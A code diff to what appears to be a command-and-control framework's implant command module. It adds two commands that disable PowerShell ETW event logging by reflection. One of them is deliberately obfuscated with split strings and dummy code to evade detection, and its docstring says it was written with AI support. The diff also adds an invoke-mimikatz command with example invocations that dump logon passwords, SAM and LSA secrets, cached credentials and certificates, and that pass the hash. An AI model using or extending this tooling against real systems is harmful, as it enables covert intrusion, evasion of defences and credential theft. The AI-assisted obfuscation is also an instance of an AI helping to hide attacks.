@@ -145,6 +145,8 @@ def do_disable_amsi_2(user, command, implant_id):
 
     ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass
 
+    With support from AI
+
     Examples:
         disable-amsi-2
     """
@@ -222,6 +224,97 @@ Write-Output "Script execution completed."
 
     insert_object(new_task)
 
+
+
+@command(commands, commands_help, examples, block_help)
+def do_disable_etw_1(user, command, implant_id):
+    """
+    Disables the PSEtwLogProvider
+
+    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/etw-block
+    ref: https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
+
+    Examples:
+        disable-etw-1
+    """
+
+    command = """
+[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+"""
+
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+@command(commands, commands_help, examples, block_help)
+def do_disable_etw_2(user, command, implant_id):
+    """
+    Disables the PSEtwLogProvider
+
+    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/etw-block
+    ref: https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
+
+    With support from AI
+
+    Examples:
+        disable-etw-2
+    """
+
+    command = """
+# Bloat: Adding unnecessary variables and functions
+function Get-ObfuscationLevel {
+    param (
+        [int]$level = 1
+    )
+    return $level * 2
+}
+
+$dummyVar1 = "Lorem ipsum dolor sit amet"
+$dummyVar2 = "consectetur adipiscing elit"
+$dummyVar3 = "sed do eiusmod tempor incididunt ut labore et dolore magna aliqua"
+
+# Obfuscated and bloated main code
+function Invoke-MainFunction {
+    # More bloat: Unnecessary loops and conditions
+    for ($i = 0; $i -lt (Get-ObfuscationLevel 3); $i++) {
+        if ($i % 2 -eq 0) {
+            [void]($dummyVar1 -match $dummyVar2)
+        } else {
+            [void]($dummyVar3 -match $dummyVar1)
+        }
+    }
+
+    # Actual obfuscated code
+    $assemblyLoad = 'L' + 'oadWithPartialName'
+    $typeGet = 'Get' + 'Type'
+    $fieldGet = 'Get' + 'Field'
+    $setValue = 'Set' + 'Value'
+    $nonPublicInstance = 'Non' + 'Public,' + 'Instance'
+    $nonPublicStatic = 'Non' + 'Public,' + 'Static'
+
+    [Reflection.Assembly]::$assemblyLoad('System.Core').$typeGet('System.Diagnostics.Eventing.EventProvider').$fieldGet('m_enabled', $nonPublicInstance).$setValue(
+        [Ref].Assembly.$typeGet('System.Management.Automation.Tracing.PSEtwLogProvider').$fieldGet('etwProvider', $nonPublicStatic).GetValue($null),
+        0
+    )
+}
+
+Invoke-MainFunction
+"""
+
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 @command(commands, commands_help, examples, block_help)
 def do_install_servicelevel_persistence(user, command, implant_id):
@@ -574,6 +667,36 @@ def do_invoke_wmi_payload(user, command, implant_id):
         print_bad(f"Payload not found: {path}")
         return
 
+
+@command(commands, commands_help, examples, block_help, name="invoke-mimikatz")
+def do_invoke_mimikatz(user, command, implant_id):
+    """
+    Uses Invoke-Mimikatz to run mimikatz on the target
+
+    https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1
+
+    Requires privileged on the target to run the command and will store the output in the DB
+
+    Examples:
+        invoke-mimikatz -command '"sekurlsa::logonpasswords"'
+        invoke-mimikatz -command '"privilege::debug" "lsadump::sam"'
+        invoke-mimikatz -command '"privilege::debug" "lsadump::lsa"'
+        invoke-mimikatz -command '"privilege::debug" "lsadump::cache"'
+        invoke-mimikatz -command '"privilege::debug" "lsadump::secrets"'
+        invoke-mimikatz -command '"ts::multirdp"'
+        invoke-mimikatz -command '"privilege::debug"'
+        invoke-mimikatz -command '"crypto::capi"'
+        invoke-mimikatz -command '"crypto::certificates /export"'
+        invoke-mimikatz -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 @command(commands, commands_help, examples, block_help)
 def do_invoke_dcom_payload(user, command, implant_id):
